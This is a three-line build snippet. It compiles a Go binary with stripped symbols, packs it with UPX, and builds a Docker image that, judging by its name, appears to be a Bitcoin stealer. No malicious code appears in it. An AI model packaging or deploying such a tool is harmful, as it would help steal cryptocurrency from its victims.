CGO_ENABLED=0  GOOS=linux  GOARCH=amd64  go build -ldflags "-s -w" .

upx --best --lzma btc-stealer

sudo docker build -f Dockerfile -t btc-stealer:v1.0 .